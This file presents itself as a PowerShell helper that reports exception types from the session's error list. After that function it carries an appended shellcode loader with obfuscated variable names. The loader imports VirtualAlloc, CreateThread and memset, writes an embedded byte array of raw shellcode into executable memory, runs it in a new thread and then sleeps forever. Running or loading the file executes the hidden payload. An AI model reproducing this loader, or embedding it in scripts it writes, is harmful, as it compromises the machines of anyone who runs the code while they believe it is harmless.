﻿function Get-MrExceptionType {

    [CmdletBinding()]
    param (
        [ValidateRange(1,256)]
        [int]$Count = 1
    )
    
    if ($Error.Count -ge 1) {

        if ($Count -gt $Error.Count) {
            $Count = $Error.Count
        }

        for ($i = 0; $i -lt $Count; $i++) {

            [PSCustomObject]@{
                ErrorNumber = "`$Error[$i]"
                ExceptionType = if ($Error[$i].exception) {$Error[$i].Exception.GetType().FullName}
            }

        }

    }
    else {
        Write-Warning -Message 'No errors have been generated for the current PowerShell session.'
    }
    
}
$KJ9g = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $KJ9g -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x82,0x00,0xbf,0xd2,0xdb,0xc3,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0x8d,0xe2,0x4a,0x2e,0x79,0x60,0xb4,0xcf,0x79,0x05,0x3c,0x2a,0x48,0x05,0x5a,0x3e,0xfa,0xb5,0x28,0x12,0xf6,0x3e,0x7c,0x87,0x8d,0x33,0xa9,0xa8,0x26,0xf9,0x8f,0x87,0xb7,0x52,0xf3,0x86,0x3b,0xa9,0x20,0x69,0x02,0x62,0x35,0x68,0x43,0x9f,0xb4,0x38,0x1c,0xeb,0x6b,0xad,0x29,0xa1,0xb7,0x46,0x61,0x27,0xb0,0xbb,0x31,0x46,0x91,0x6d,0x4a,0x11,0x31,0x8f,0x9f,0x29,0x78,0x97,0xfc,0x14,0x32,0x2c,0x36,0xe2,0xc5,0xe4,0x07,0x0b,0x69,0xc9,0xa8,0xfe,0x73,0x0d,0x0e,0xe1,0x01,0x67,0x6d,0x9c,0x11,0xbc,0x0c,0x7a,0x97,0x27,0xb6,0x09,0x0f,0x8c,0x47,0xdd,0xd6,0x47,0x4b,0xaa,0x9d,0x00,0x4f,0x2d,0x71,0x3b,0x6b,0xa6,0x74,0xec,0xfa,0xfc,0x52,0x28,0xa7,0xa7,0xfb,0x69,0x0d,0x09,0x03,0x69,0xee,0xf6,0xa1,0xe1,0x02,0xe2,0xdb,0xab,0x4a,0xc7,0xd1,0x53,0x8a,0x4f,0x61,0x27,0xb8,0xd0,0xd9,0xaf,0xf0,0x99,0xc7,0x28,0xf7,0xb3,0xb0,0xa7,0x06,0x3c,0xc1,0xee,0xcc,0x68,0x91,0x98,0xe5,0x10,0x7a,0x59,0x0a,0xc5,0x17,0x5c,0x9c,0xb3,0x8b,0xdf,0x18,0x54,0x56,0xe0,0xa6,0xe1,0xdf,0x06,0xf6,0xb9,0x8f,0x96,0xb6,0x69,0x70,0x47,0x5e,0x60,0x7f,0xb8,0x7e,0x8b,0x55,0xd1,0x14,0x64,0x00,0x89,0x80,0x1d,0x09,0x41,0x31,0xe1,0x87,0x2f,0x71,0x69,0x24,0xcf,0x3f,0x9a,0x41,0xc3,0xd7,0x6a,0x1c,0xb9,0x71,0x74,0x8a,0xd4,0x7d,0xe0,0x31,0x7f,0x2a,0x9c,0x3b,0xa6,0x1c,0x03,0xc3,0x8d,0x17,0x8a,0x51,0x6e,0x4f,0xf3,0xb5,0x6e,0x8f,0xa5,0xdf,0x6e,0xe7,0x11,0x84,0x3c,0x12,0x5e,0x11,0x51,0x8f,0xcb,0x9a,0x00,0x7c,0x5b,0xf3,0xae,0x5b,0xab,0x5c,0x50,0x8e,0x2d,0xa0,0x87,0xf6,0x5b,0xc8,0x1b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$T6Or=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($T6Or.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$T6Or,0,0,0);for (;;){Start-sleep 60};
